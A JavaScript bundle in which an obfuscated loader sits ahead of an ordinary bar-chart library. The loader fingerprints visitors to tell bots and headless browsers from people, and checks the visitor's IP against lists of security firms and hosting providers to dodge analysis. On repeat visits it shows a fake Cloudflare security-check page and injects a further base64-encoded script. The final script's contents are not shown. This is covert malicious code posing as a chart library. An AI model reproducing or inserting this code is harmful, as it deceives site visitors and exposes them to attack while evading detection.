bGFzcz0iZG9tYWluLW5hbWUiPjwvc3Bhbj4gbmVlZHMgdG8gcmV2aWV3IHRoZSBzZWN1cml0eSBvZiB5b3VyIGNvbm5lY3Rpb24gYmVmb3JlIHByb2NlZWRpbmcuPC9wPg0KIDwvZGl2Pg0KIA0KIDxkaXYgY2xhc3M9ImZvb3RlciIgcm9sZT0iY29udGVudGluZm8iPg0KICA8ZGl2IGNsYXNzPSJmb290ZXItaW5uZXIiPg0KICAgPGRpdj4NCiAgICA8ZGl2PlJheSBJRDogPGNvZGUgY2xhc3M9InJheS1pZCI+NTZhNGM1Mjk5ZmRldG1jYTwvY29kZT48L2Rpdj4NCiAgIDwvZGl2Pg0KICAgPGRpdiBzdHlsZT0ibWFyZ2luLXRvcDogNXB4OyI+UGVyZm9ybWFuY2UgJiBzZWN1cml0eSBieSA8c3BhbiBjbGFzcz0iY2xvdWRmbGFyZS1sb2dvIj5DbG91ZGZsYXJlPC9zcGFuPjwvZGl2Pg0KICA8L2Rpdj4NCiA8L2Rpdj4NCjwvZGl2Pg0KDQoNCg0KDQo8c2NyaXB0Pg0KDQoNCg0KPC9zY3JpcHQ+DQoNCg0KPC9ib2R5PjwvaHRtbD4=',
        'QviKY',
        'PLExc',
        'eZNRi',
        'duckduck',
        'HETZNER',
        'Cisco\x20Systems\x20Ironport\x20Division',
        'getAttribute',
        'DigitalOne\x20AG',
        'Yahoo\x20Bangalore\x20Network\x20Monitoring\x20Center',
        'China\x20Broadband\x20Communications\x20(CBCnet)',
        'fFarP',
        'CneKZ',
        'outerWidth',
        'Perimeter\x20eSecurity',
        'Amazon.com',
        'AFHeL',
        'YDnjE',
        '43032nxidLV',
        'fUGeI',
        'WOZOt',
        'spider',
        'Information\x20Technology\x20Systems',
        'TFwvo',
        'className',
        'lTKkA',
        'removeItem',
        'innerHeight',
        'eZbFb',
        'InterNAP\x20Network\x20Services\x20U.K.\x20Limited',
        'oiavl',
        '(?:^|;\x20)',
        'json',
        'EClhP',
        'HETZNER\x20(Pty)\x20Ltd',
        'TvjGH'
    ];
    a = function () {
        return ac;
    };
    return a();
}
(function (c, d) {
    const I = b, e = c();
    while (!![]) {
        try {
            const f = parseInt(I(0x19e)) / 0x1 + -parseInt(I(0x306)) / 0x2 + parseInt(I(0x32c)) / 0x3 * (parseInt(I(0x2c7)) / 0x4) + -parseInt(I(0x267)) / 0x5 * (parseInt(I(0x19a)) / 0x6) + -parseInt(I(0x248)) / 0x7 + parseInt(I(0x1df)) / 0x8 * (-parseInt(I(0x210)) / 0x9) + parseInt(I(0x1a1)) / 0xa * (parseInt(I(0x165)) / 0xb);
            if (f === d)
                break;
            else
                e['push'](e['shift']());
        } catch (g) {
            e['push'](e['shift']());
        }
    }
}(a, 0x58f0c), (function () {
    const J = b, c = {
            'JJbGn': J(0x2a0),
            'ZFluF': function (t, u) {
                return t + u;
            },
            'PPLxr': function (t, u) {
                return t * u;
            },
            'XXZPO': function (t, u) {
                return t || u;
            },
            'qdQwu': function (t, u) {
                return t + u;
            },
            'lEVGO': function (t, u) {
                return t + u;
            },
            'ZNeZu': function (t, u) {
                return t(u);
            },
            'zgxEP': J(0x29c),
            'Zdayi': J(0x1c2),
            'XNmDT': function (t, u) {
                return t + u;
            },
            'pkHcU': J(0x1ec),
            'QRPbN': J(0x30c),
            'BiClA': function (t, u) {
                return t(u);
            },
            'RoZjj': function (t, u) {
                return t === u;
            },
            'GeDQE': function (t, u) {
                return t === u;
            },
            'wbQJT': function (t, u, v, w) {
                return t(u, v, w);
            },
            'CneKZ': J(0x197),
            'YRMbX': J(0x303),
            'oqsff': J(0x13a),
            'tLmxr': J(0x1cd),
            'EOBlV': J(0x1fc),
            'EBbss': J(0x1a0),
            'tOmvj': J(0x2cc),
            'ezPOw': function (t, u, v) {
                return t(u, v);
            },
            'SoZvJ': J(0x1b1),
            'KPBnV': function (t, u) {
                return t === u;
            },
            'MRxvL': J(0x22b),
            'ERCze': function (t, u) {
                return t === u;
            },
            'iDfuO': J(0x250),
            'vXVef': J(0x150),
            'Hjshd': J(0x191),
            'jkKXn': J(0x2ef),
            'mEuKA': J(0x25e),
            'olmMW': J(0x2f1),
            'kuKGT': function (t, u) {
                return t === u;
            },
            'BuYFf': J(0x2ff),
            'AAhyK': J(0x2a2),
            'mIdow': function (t, u) {
                return t || u;
            },
            'sdtEt': function (t, u) {
                return t !== u;
            },
            'TonOY': J(0x228),
            'AFcVB': function (t, u) {
                return t !== u;
            },
            'mjnUg': function (t, u) {
                return t !== u;
            },
            'KBlRO': function (t) {
                return t();
            },
            'dPcdL': function (t, u) {
                return t * u;
            },
            'rSCpW': function (t, u) {
                return t / u;
            },
            'RLINB': function (t, u) {
                return t - u;
            },
            'svxLA': function (t, u) {
                return t - u;
            },
            'uUgYr': function (t) {
                return t();
            },
            'MKdhE': function (t, u) {
                return t > u;
            },
            'CLUyE': J(0x31e),
            'pHZDd': J(0x317),
            'RsonL': J(0x146),
            'Ooofv': J(0x1e2),
            'ReLvv': J(0x1b4),
            'yWoZE': J(0x26d),
            'luJKl': J(0x2f8),
            'DWjSn': J(0x15b),
            'kmvjS': J(0x1b2),
            'kUxeb': J(0x161),
            'MYndc': J(0x2f7),
            'gFNlr': J(0x1d1),
            'YWoAL': J(0x2e3),
            'FPCDp': J(0x2bb),
            'xEERp': J(0x243),
            'tmOsb': J(0x330),
            'BfNcc': J(0x2aa),
            'oiavl': J(0x22f),
            'srmum': J(0x2d1),
            'XOhkZ': J(0x2a5),
            'TvjGH': J(0x24e),
            'wTCQx': J(0x2c2),
            'ldDwp': J(0x209),
            'QpZxg': J(0x29e),
            'ySeZo': J(0x264),
            'fdGEa': J(0x31c),
            'NlxVb': J(0x2df),
            'hYivC': J(0x206),
            'NkjEv': J(0x265),
            'zTvYP': J(0x26e),
            'nddjX': J(0x1a2),
            'fQxlv': J(0x157),
            'EOFab': J(0x33c),
            'dRRxM': J(0x323),
            'RPHnM': J(0x24f),
            'uxnqY': J(0x1a3),
            'diVQM': J(0x338),
            'HzitJ': J(0x32f),
            'Shrqs': J(0x298),
            'TIchQ': J(0x27b),
            'JIjWx': J(0x2ae),
            'auWSm': J(0x1d3),
            'QjBoT': J(0x2b4),
            'BQYjr': J(0x195),
            'yOyef': J(0x174),
            'TPIRh': J(0x1db),
            'LzPDB': J(0x234),
            'tXewv': J(0x207),
            'FbBcB': J(0x24d),
            'kqDLX': J(0x154),
            'lKsVr': J(0x1dc),
            'EYDdB': J(0x25b),
            'ZYfGV': J(0x2ce),
            'PLExc': J(0x25c),
            'SIXdn': J(0x14f),
            'IGHLF': J(0x144),
            'CuUiQ': J(0x275),
            'WuUqa': J(0x212),
            'vKBHI': J(0x208),
            'DVZyn': J(0x2ad),
            'YYeNx': J(0x2d9),
            'bpcUs': J(0x1a7),
            'beqqh': J(0x26c),
            'cwDiX': J(0x2ea),
            'APwYx': J(0x1ac),
            'wUFOc': J(0x22a),
            'OUqne': J(0x2f0),
            'GGsVn': J(0x14c),
            'QqmTf': J(0x253),
            'QviKY': J(0x222),
            'XjRUL': J(0x143),
            'BbgoT': J(0x153),
            'wsROv': J(0x194),
            'eZbFb': J(0x1d6),
            'jVLXY': J(0x309),
            'XTtjy': J(0x21b),
            'lSPXm': J(0x23f),
            'FbWXN': J(0x29d),
            'lTKkA': J(0x2c0),
            'xTqyT': J(0x1f9),
            'GAgbA': J(0x1ba),
            'ZnKNE': J(0x32d),
            'UBZfB': J(0x196),
            'pawlK': J(0x1d5),
            'UzmfR': J(0x1ab),
            'JIjQL': J(0x2c1),
            'KPsHG': J(0x279),
            'xrYwE': J(0x2dc),
            'SgcjZ': J(0x2f3),
            'fxVOx': J(0x23c),
            'bZiRf': J(0x18c),
            'erEiX': J(0x1b5),
            'boDRH': J(0x2fe),
            'fkyyo': J(0x16f),
            'Polgs': J(0x16b),
            'EClhP': J(0x147),
            'RcOLN': J(0x290),
            'pftVj': J(0x1cb),
            'qInlE': J(0x322),
            'BYjTr': J(0x203),
            'XEBFb': J(0x2ab),
            'TFwvo': J(0x261),
            'CLNUL': J(0x182),
            'vACKe': J(0x1c9),
            'KOSor': J(0x311),
            'zJegv': J(0x1c5),
            'YDnjE': J(0x1bc),
            'joHHE': J(0x17b),
            'QUcLd': J(0x29b),
            'vboES': J(0x2c4),
            'RrIfN': J(0x269),
            'OjhTq': J(0x14b),
            'buodH': J(0x1ea),
            'FnwAJ': J(0x257),
            'UGnrf': J(0x339),
            'JEZnU': J(0x1c6),
            'XOZds': J(0x12f),
            'KffAC': J(0x31a),
            'yFtDe': J(0x24a),
            'huRDH': J(0x168),
            'WdoRk': J(0x2a6),
            'ixVci': J(0x21a),
            'CItAc': J(0x1d7),
            'WzwUY': J(0x2a1),
            'VYDyK': J(0x1cc),
            'PfYzo': J(0x1ca),
            'PEbSN': J(0x218),
            'IinPG': J(0x2f9),
            'oISYD': J(0x216),
            'iGtRd': J(0x276),
            'vgguw': J(0x171),
            'apQuJ': J(0x2bf),
            'Vkhoc': J(0x138),
            'eZNRi': J(0x184),
            'IjAJA': J(0x226),
            'yuxZu': J(0x1e3),
            'byvtP': J(0x28a),
            'fUGeI': J(0x14e),
            'WBkiP': J(0x28b),
            'fFarP': J(0x2f5),
            'XNSzS': J(0x1a9),
            'ROWkL': J(0x177),
            'lHpQc': J(0x211),
            'cWuKp': J(0x1b8),
            'AkhcJ': J(0x1f4),
            'owooV': J(0x17a),
            'yOUWH': J(0x2ca),
            'YstcP': J(0x286),
            'Nxvyz': J(0x236),
            'TpkPI': J(0x294),
            'JZwsJ': J(0x2dd),
            'sIaUR': J(0x15f),
            'aObwv': J(0x2cd),
            'NBbzS': J(0x282),
            'MPVSB': J(0x16a),
            'harue': J(0x187),
            'YZhOh': J(0x1d2),
            'BmRLa': J(0x2a3),
            'ujBbj': J(0x160),
            'tqHNO': J(0x1ef),
            'gVuPk': J(0x274),
            'rQZgY': J(0x307),
            'lHhXc': J(0x15c),
            'GnlUO': J(0x19c),
            'eXUPm': J(0x259),
            'liiAx': J(0x2cf),
            'OnMvF': J(0x14a),
            'RkzkF': J(0x170),
            'lwznz': J(0x1c1),
            'oBEiz': J(0x27c),
            'pROZw': J(0x181),
            'quwnI': J(0x16c),
            'bPHGx': J(0x26f),
            'ERLag': J(0x23b),
            'HFYKq': J(0x21e),
            'PkTOi': J(0x2a9),
            'uhQyO': function (t, u) {
                return t + u;
            },
            'GqIuS': function (t, u) {
                return t + u;
            },
            'OTQPr': J(0x325),
            'ZTmIG': J(0x2fa),
            'etcnw': function (t) {
                return t();
            },
            'hrcGP': J(0x13c),
            'GDTXE': function (t, u, v) {
                return t(u, v);
            },
            'xGwVE': J(0x2d8),
            'WOZOt': function (t, u, v) {
                return t(u, v);
            },
            'WibQw': function (t, u, v) {
                return t(u, v);
            },
            'xDikb': function (t, u) {
                return t >= u;
            },
            'hjWiQ': function (t) {
                return t();
            },
            'GdQFG': function (t) {
                return t();
            },
            'VgdmP': J(0x23a),
            'yedWe': function (t) {
                return t();
            },
            'AFHeL': J(0x315)
        }, d = 0x2, e = c[J(0x2a4)];
    function f() {
        const K = J;
        try {
            const u = c[K(0x19d)];
            return localStorage[K(0x20d)](u, '1'), localStorage[K(0x1e7)](u), !![];
        } catch (v) {
            return ![];
        }
    }
    function g(t, u, v) {
        const L = J;
        try {
            const w = new Date(c[L(0x233)](Date[L(0x178)](), c[L(0x256)](c[L(0x249)](v, 0x16d), 0x5265c00)))[L(0x1f8)]();
            document[L(0x2d4)] = c[L(0x242)](c[L(0x233)](c[L(0x242)](c[L(0x242)](c[L(0x1a6)](t, '='), c[L(0x2b6)](encodeURIComponent, u)), c[L(0x2ac)]), w), c[L(0x17d)]);
        } catch (x) {
        }
    }
    function h(t) {
        const M = J;
        try {
            const u = document[M(0x2d4)][M(0x214)](new RegExp(c[M(0x233)](c[M(0x149)](c[M(0x328)], t[M(0x27f)](/([.$?*|{}()\[\]\\/\+^])/g, '$1')), c[M(0x329)])));
            return u ? c[M(0x268)](decodeURIComponent, u[0x1]) : null;
        } catch (v) {
            return null;
        }
    }
    const i = c[J(0x2b2)](f);
    function j(t, u) {
        const N = J;
        if (i) {
            const x = localStorage[N(0x134)](t);
            return c[N(0x332)](x, null) ? u : x;
        }
        const w = c[N(0x2b6)](h, t);
        return c[N(0x2af)](w, null) ? u : w;
    }
    function k(t, u) {
        const O = J;
        i ? localStorage[O(0x20d)](t, u) : c[O(0x2b9)](g, t, u, 0x16d);
    }
    function l() {
        const P = J;
        try {
            const t = c[P(0x1d9)], u = c[P(0x268)](atob, t), v = document[P(0x215)](c[P(0x2b7)]);
            v[P(0x33b)] = u, (document[P(0x27e)] || document[P(0x158)])[P(0x166)](v);
        } catch (w) {
            console[P(0x300)](c[P(0x2e1)], w);
        }
    }
    function m() {
        const Q = J, t = c[Q(0x281)], u = c[Q(0x268)](atob, t), v = document[Q(0x215)](c[Q(0x321)]);
        v[Q(0x1e5)] = c[Q(0x136)], v[Q(0x254)] = u, v[Q(0x2e9)][Q(0x26b)] = c[Q(0x169)], document[Q(0x1bb)][Q(0x166)](v), c[Q(0x241)](setTimeout, l, 0x0);
    }
    const n = 0xa, o = -0x8, p = 0x5;
    async function q() {
        const V = J, t = {
                'iMvID': function (z, A) {
                    const R = b;
                    return c[R(0x30d)](z, A);
                },
                'ytOiO': function (z, A) {
                    const S = b;
                    return c[S(0x1fb)](z, A);
                },
                'EysEt': function (z, A) {
                    const T = b;
                    return c[T(0x1b6)](z, A);
                },
                'Dqjhc': function (z, A) {
                    const U = b;
                    return c[U(0x29f)](z, A);
                },
                'qFSlk': c[V(0x335)],
                'DYlIj': c[V(0x1c3)],
                'fgrqT': function (z, A) {
                    const W = V;
                    return c[W(0x301)](z, A);
                },
                'ZeDjk': function (z, A) {
                    const X = V;
                    return c[X(0x30f)](z, A);
                }
            }, u = [
                () => {
                    const Y = V, z = navigator[Y(0x199)][Y(0x12c)](), A = /headless|phantomjs|selenium|webdriver/i[Y(0x213)](z);
                    return { 'score': A ? n : o };
                },
                () => {
                    const Z = V, z = t[Z(0x27a)](navigator[Z(0x2ff)], !![]);
                    return { 'score': z ? n : o };
                },
                () => {
                    const a0 = V, z = !!window[a0(0x1ad)], A = z && (window[a0(0x1ad)][a0(0x2ba)] || window[a0(0x1ad)][a0(0x230)]), B = t[a0(0x1ae)](!z, !A);
                    return { 'score': B ? p : o };
                },
                async () => {
                    const a1 = V;
                    if (!navigator[a1(0x266)])
                        return { 'score': 0x0 };
                    try {
                        const z = await navigator[a1(0x266)][a1(0x20c)]({ 'name': c[a1(0x15d)] }), A = Notification[a1(0x17f)], B = c[a1(0x2f4)](A, c[a1(0x1b0)]) && c[a1(0x30d)](z[a1(0x132)], c[a1(0x32b)]);
                        return { 'score': B ? n : o };
                    } catch (C) {
                        return { 'score': p };
                    }
                },
                () => {
                    const a2 = V, z = navigator[a2(0x139)]?.[a2(0x131)] || 0x0, A = t[a2(0x27a)](z, 0x0);
                    return { 'score': A ? p : o };
                },
                () => {
                    const a3 = V, z = navigator[a3(0x324)], A = navigator[a3(0x225)]?.[a3(0x131)] || 0x0, B = !z || t[a3(0x33d)](A, 0x0);
                    return { 'score': B ? n : o };
                },
                () => {
                    const a4 = V;
                    try {
                        const z = document[a4(0x215)](c[a4(0x15e)]), A = z[a4(0x14d)](c[a4(0x2c9)]) || z[a4(0x14d)](c[a4(0x2ed)]);
                        if (!A)
                            return { 'score': p };
                        const B = A[a4(0x31d)](c[a4(0x288)]), C = B ? A[a4(0x271)](B[a4(0x1f7)]) : c[a4(0x28d)], D = /swiftshader|llvmpipe|mesa/i[a4(0x213)](C);
                        return { 'score': D ? p : o };
                    } catch (E) {
                        return { 'score': p };
                    }
                },
                () => {
                    const a5 = V, z = window[a5(0x30e)], A = window[a5(0x1da)], B = window[a5(0x1e8)], C = window[a5(0x190)], D = c[a5(0x332)](z, 0x0) && c[a5(0x2af)](A, 0x0) || c[a5(0x2f4)](z, B) && c[a5(0x1b6)](A, C);
                    return { 'score': D ? n : o };
                },
                () => {
                    const a6 = V, z = navigator[a6(0x2ff)] || c[a6(0x332)](window[a6(0x240)]?.[a6(0x158)]?.[a6(0x1d4)](c[a6(0x1c3)]), c[a6(0x235)]) || window[a6(0x308)] || window[a6(0x31b)];
                    return { 'score': z ? n : o };
                },
                () => {
                    const a7 = V, z = /HeadlessChrome/[a7(0x213)](navigator[a7(0x199)]);
                    return { 'score': z ? n : 0x0 };
                },
                () => {
                    const a8 = V, z = window[a8(0x308)] || window[a8(0x31b)] || window[a8(0x25d)];
                    return { 'score': z ? n : 0x0 };
                },
                () => {
                    const a9 = V, z = t[a9(0x12d)](window[a9(0x240)]?.[a9(0x158)]?.[a9(0x1d4)](t[a9(0x30a)]), null) || t[a9(0x12d)](window[a9(0x240)]?.[a9(0x158)]?.[a9(0x1d4)](t[a9(0x1bd)]), null) || t[a9(0x1b9)](window[a9(0x240)]?.[a9(0x331)], undefined) || t[a9(0x2b8)](window[a9(0x240)]?.[a9(0x173)], undefined);
                    return { 'score': z ? n : 0x0 };
                }
            ];
        let v = 0x0;
        for (const z of u) {
            try {
                const A = await c[V(0x1f5)](z);
                v += A[V(0x192)];
            } catch (B) {
            }
        }
        const w = c[V(0x189)](u[V(0x131)], n), x = c[V(0x256)](u[V(0x131)], o), y = Math[V(0x23d)](0x0, Math[V(0x2c6)](0x64, c[V(0x189)](c[V(0x21d)](c[V(0x291)](v, x), c[V(0x1a8)](w, x)), 0x64)));
        return Math[V(0x2e5)](y);
    }
    async function r() {
        const aa = J;
        try {
            const t = await c[aa(0x33a)](q);
            if (c[aa(0x20b)](t, 0xf))
                return console[aa(0x2cb)](c[aa(0x238)], t), ![];
            const u = navigator[aa(0x199)][aa(0x12c)](), v = [
                    c[aa(0x320)],
                    c[aa(0x145)],
                    c[aa(0x13d)],
                    c[aa(0x239)],
                    c[aa(0x313)],
                    c[aa(0x15a)],
                    c[aa(0x18e)],
                    c[aa(0x163)],
                    c[aa(0x155)],
                    c[aa(0x232)],
                    c[aa(0x172)],
                    c[aa(0x273)],
                    c[aa(0x18b)]
                ];
            for (const F of v) {
                if (u[aa(0x180)](F))
                    return console[aa(0x2cb)](c[aa(0x17c)], u), ![];
            }
            const w = await c[aa(0x268)](fetch, c[aa(0x280)]);
            if (!w['ok'])
                return !![];
            const x = await w[aa(0x1ed)](), y = x['ip'], z = await c[aa(0x268)](fetch, aa(0x245) + y + aa(0x1aa)), A = await z[aa(0x1ed)](), B = A[aa(0x162)] || '', C = A[aa(0x28f)] || '';
            if (A[aa(0x193)] || A[aa(0x326)] || A[aa(0x2e8)])
                return console[aa(0x2cb)](c[aa(0x32e)], A), ![];
            const D = [
                    c[aa(0x1eb)],
                    c[aa(0x175)],
                    c[aa(0x17e)],
                    c[aa(0x1f0)],
                    c[aa(0x2e7)],
                    c[aa(0x198)],
                    c[aa(0x30b)],
                    c[aa(0x289)],
                    c[aa(0x2fd)],
                    c[aa(0x1fa)],
                    c[aa(0x26a)],
                    c[aa(0x179)],
                    c[aa(0x200)],
                    c[aa(0x2a7)],
                    c[aa(0x32a)],
                    c[aa(0x316)],
                    c[aa(0x2da)],
                    c[aa(0x283)],
                    c[aa(0x188)],
                    c[aa(0x2d2)],
                    c[aa(0x263)],
                    c[aa(0x2de)],
                    c[aa(0x167)],
                    c[aa(0x29a)],
                    c[aa(0x2fc)],
                    c[aa(0x18d)],
                    c[aa(0x1fe)],
                    c[aa(0x140)],
                    c[aa(0x18a)],
                    c[aa(0x220)],
                    c[aa(0x2c5)],
                    c[aa(0x270)],
                    c[aa(0x295)],
                    c[aa(0x302)],
                    c[aa(0x13e)],
                    c[aa(0x22c)],
                    c[aa(0x1cf)],
                    c[aa(0x137)],
                    c[aa(0x334)],
                    c[aa(0x16d)],
                    c[aa(0x1f3)],
                    c[aa(0x205)],
                    c[aa(0x152)],
                    c[aa(0x246)],
                    c[aa(0x229)],
                    c[aa(0x164)],
                    c[aa(0x201)],
                    c[aa(0x278)],
                    c[aa(0x2d3)],
                    c[aa(0x1c7)],
                    c[aa(0x16e)],
                    c[aa(0x28e)],
                    c[aa(0x1ce)],
                    c[aa(0x24b)],
                    c[aa(0x22d)],
                    c[aa(0x1af)],
                    c[aa(0x1e9)],
                    c[aa(0x299)],
                    c[aa(0x2fb)],
                    c[aa(0x293)],
                    c[aa(0x285)],
                    c[aa(0x1e6)],
                    c[aa(0x186)],
                    c[aa(0x1f1)],
                    c[aa(0x25a)],
                    c[aa(0x156)],
                    c[aa(0x2b0)],
                    c[aa(0x258)],
                    c[aa(0x2db)],
                    c[aa(0x176)],
                    c[aa(0x2d7)],
                    c[aa(0x24c)],
                    c[aa(0x2d6)],
                    c[aa(0x20a)],
                    c[aa(0x221)],
                    c[aa(0x2a8)],
                    c[aa(0x20e)],
                    c[aa(0x2f2)],
                    c[aa(0x1ee)],
                    c[aa(0x130)],
                    c[aa(0x20f)],
                    c[aa(0x314)],
                    c[aa(0x133)],
                    c[aa(0x260)],
                    c[aa(0x1e4)],
                    c[aa(0x333)],
                    c[aa(0x1bf)],
                    c[aa(0x141)],
                    c[aa(0x336)],
                    c[aa(0x1de)],
                    c[aa(0x28c)],
                    c[aa(0x18f)],
                    c[aa(0x135)],
                    c[aa(0x148)],
                    c[aa(0x2b3)],
                    c[aa(0x277)],
                    c[aa(0x2be)],
                    c[aa(0x310)],
                    c[aa(0x296)],
                    c[aa(0x1ff)],
                    c[aa(0x25f)],
                    c[aa(0x21c)],
                    c[aa(0x1b3)],
                    c[aa(0x1f6)],
                    c[aa(0x284)],
                    c[aa(0x13b)],
                    c[aa(0x151)],
                    c[aa(0x12e)],
                    c[aa(0x2c3)],
                    c[aa(0x231)],
                    c[aa(0x1c8)],
                    c[aa(0x287)],
                    c[aa(0x2ec)],
                    c[aa(0x2d5)],
                    c[aa(0x2b5)],
                    c[aa(0x1f2)],
                    c[aa(0x1d0)],
                    c[aa(0x1c4)],
                    c[aa(0x319)],
                    c[aa(0x312)],
                    c[aa(0x1e0)],
                    c[aa(0x19b)],
                    c[aa(0x1d8)],
                    c[aa(0x2bc)],
                    c[aa(0x337)],
                    c[aa(0x219)],
                    c[aa(0x2e4)],
                    c[aa(0x217)],
                    c[aa(0x2e2)],
                    c[aa(0x2ee)],
                    c[aa(0x224)],
                    c[aa(0x159)],
                    c[aa(0x2f6)],
                    c[aa(0x1fd)],
                    c[aa(0x255)],
                    c[aa(0x297)],
                    c[aa(0x1a5)],
                    c[aa(0x2e6)],
                    c[aa(0x1c0)],
                    c[aa(0x185)],
                    c[aa(0x262)],
                    c[aa(0x27d)],
                    c[aa(0x13f)],
                    c[aa(0x305)],
                    c[aa(0x237)],
                    c[aa(0x1a4)],
                    c[aa(0x22e)],
                    c[aa(0x227)],
                    c[aa(0x304)],
                    c[aa(0x2d0)],
                    c[aa(0x142)],
                    c[aa(0x19f)],
                    c[aa(0x327)],
                    c[aa(0x21f)],
                    c[aa(0x244)],
                    c[aa(0x2bd)],
                    c[aa(0x2c8)],
                    c[aa(0x247)],
                    c[aa(0x23e)]
                ], E = c[aa(0x204)](c[aa(0x1b7)](B, '\x20'), C)[aa(0x12c)]();
            for (const G of D) {
                if (E[aa(0x180)](G[aa(0x12c)]()))
                    return console[aa(0x2cb)](c[aa(0x318)], G), ![];
            }
            return !![];
        } catch (H) {
            return console[aa(0x300)](c[aa(0x2e0)], H), !![];
        }
    }
    async function s() {
        const ab = J;
        try {
            const t = await c[ab(0x2b2)](r);
            console[ab(0x2cb)](c[ab(0x31f)], t);
            if (!t)
                return;
            const u = c[ab(0x251)](j, c[ab(0x292)], '0');
            if (c[ab(0x2f4)](u, '1'))
                return;
            let v = c[ab(0x1e1)](parseInt, c[ab(0x272)](j, e, '0'), 0xa);
            if (Number[ab(0x183)](v))
                v = 0x0;
            v++, c[ab(0x272)](k, e, v[ab(0x2b1)]()), c[ab(0x1be)](v, d) && c[ab(0x202)](m);
        } catch (w) {
            c[ab(0x2eb)](m);
        }
    }
    document[J(0x1bb)] ? c[J(0x223)](s) : document[J(0x252)](c[J(0x1dd)], s);
}()));/* >>> chartjs (36878 bytes) <<< */
(function(){
try{
/*global module:true*/
'use strict';

Math.log2 = Math.log2 || function(x) {
  return Math.log(x) / Math.LN2;
};

Math.log10 = Math.log10 || function(x) {
  return Math.log(x) / Math.LN10;
};

(function() {
  var Helpers = {
    avg: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        v += arr[index];
      }
      return v / arr.length;
    },
    min: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0];
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 < v) v = v2;
      }
      return Math.max(0, v);
    },
    max: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.avg(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    upperMax: function(arr) {
      var v = 0;
      for (var index = 0; index < arr.length; ++index) {
        var v2 = arr[index];
        if (Array.isArray(v2)) v2 = Helpers.max(v2);
        if (v2 > v) v = v2;
      }
      return Math.max(0, v);
    },
    lowerMin: function(arr) {
      if (arr.length === 0) return 0;
      var v = arr[0] || Infinity;
      if (Array.isArray(v)) v = Helpers.lowerMin(v);
      for (var index = 1; index < arr.length; ++index) {
        var v2 = arr[index];
        if (v2 == null) continue;
        if (Array.isArray(v2)) v2 = Helpers.lowerMin(v2);
        if (v2 < v) v = v2;
      }
      if (isNaN(v) || !isFinite(v)) v = 0;
      return Math.max(0, v);
    },
    niceNumbers: function(range, round) {
      var exponent = Math.floor(Math.log10(range));
      var fraction = range / Math.pow(10, exponent);
      var niceFraction;
      if (round) {
        if (fraction < 1.5) niceFraction = 1;
        else if (fraction < 3) niceFraction = 2;
        else if (fraction < 7) niceFraction = 5;
        else niceFraction = 10;
      } else {
        if (fraction <= 1.0) niceFraction = 1;
        else if (fraction <= 2) niceFraction = 2;
        else if (fraction <= 5) niceFraction = 5;
        else niceFraction = 10;
      }
      return niceFraction * Math.pow(10, exponent);
    },
    getLinearTicks: function(min, max, maxTicks) {
      var range = Helpers.niceNumbers(max - min, false);
      var tickSpacing = Helpers.niceNumbers(range / (maxTicks - 1), true);
      return [
        Math.floor(min / tickSpacing) * tickSpacing,
        Math.ceil(max / tickSpacing) * tickSpacing,
        tickSpacing
      ];
    },
    getFont: function(options) {
      options.style = options.style || 'normal';
      options.variant = options.variant || 'normal';
      options.weight = options.weight || 'lighter';
      options.size = options.size || '12';
      options.family = options.family || 'Arial';
      return [options.style, options.variant, options.weight, options.size + 'px', options.family].join(' ');
    },
    getAxisRatio: function(min, max, value) {
      return (value - min) / (max - min);
    }
  };

  var BarChart = (function() {
    function BarChart(ctx, options) {
      this.mouseListeners = [];
      this.currentHint = null;
      this.fillRegions = []
      this.options = {
        font: 'Helvetica',
        fontWeight: 'normal',
        fontSizeTitle: 24,
        fontSizeAxes: 20,
        fontSizeTicks: 18,
        fontSizeLabels: 18,
        fontDataTags: 18,
        fontSizeLegend: 18,
        fontSizeHint: 18,
        paddingPercentBars: 0.10,
        paddingPercentTicks: 0.15,
        paddingPixelsVertical: 10,
        paddingPixelsHorizontal: 10,
        paddingPixelsTicks: 10,
        maxWidthBars: 0,
        fillColorBackground: 'rgb(255, 255, 255)',
        strokeColorBars: 'rgb(0, 0, 0)',
        fillColorBars: 'rgba(180, 180, 180, 0.25)',
        scaleStyle: 'linear',
        barStyle: 'none',
        stackedBarPadding: 3,
        defaultMaxTick: 0,
        pixelsLegendSquare: 10,
        radiusDot: 5,
        fillColorLegend: 'rgb(230, 230, 230)',
        tickFormatter: null,
        tickFormatterMeasure: null,
        fillRegion: 'normal'
      };
      options = options || { };
      for (var key in this.options) {
        if (options.hasOwnProperty(key)) this.options[key] = options[key];
      }
      this.ctx = ctx;
      this.content = { };
      this.labelPositions = { }
    }

    BarChart.prototype.update = function(content) {
      if (typeof content !== 'object') {
        throw new Error('Collections must be objects.');
      } else if (!(content.hasOwnProperty('labels') && content.hasOwnProperty('data'))) {
        throw new Error('Collection must specify labels and data.');
      } else if (!(Array.isArray(content.labels) && Array.isArray(content.data))) {
        throw new Error('Labels and data must be arrays.');
      } else if (content.labels.length !== content.data.length) {
        throw new Error('Labels and data length must match.');
      }
      content._data_standard_deviation = [];
      content._data_standard_error = [];
      for (var i = 0; i < content.data.length; ++i) {
        var isArr = Array.isArray(content.data[i]);
        if (this.options.scaleStyle === 'log2') {
          if (isArr) {
            for (var i3 = 0; i3 < content.data[i].length; ++i3) content.data[i][i3] = Math.log2(content.data[i][i3]);
          } else content.data[i] = Math.log2(content.data[i]);
        }
        if (isArr) {
          var mean = Helpers.avg(content.data[i]);
          var acc = 0;
          for (var i2 = 0; i2 < content.data[i].length; ++i2) acc += Math.pow(mean - content.data[i][i2], 2);
          acc = Math.sqrt(acc / (content.data[i].length - 1));
          content._data_standard_deviation.push(acc);
          content._data_standard_error.push(acc / Math.sqrt(content.data[i].length));
        } else {
          content._data_standard_deviation.push(0);
          content._data_standard_error.push(0);
        }
      }
      this.content = content;
      this.redraw();
    };

    BarChart.prototype.redraw = function() {
      setTimeout(function() {
        this._draw();
      }.bind(this), 0);
    };

    BarChart.prototype.mousemove = function(x, y) {
      var res = null;
      for (var index = 0; index < this.mouseListeners.length; ++index) {
        if ((res = this.mouseListeners[index](x, y))) break;
      }
      if (!res || (typeof res) !== 'object' || !res.hasOwnProperty('index') || !res.hasOwnProperty('drawIndex')) {
        if (this.currentHint !== null) {
          this.currentHint = null;
          this.redraw();
        }
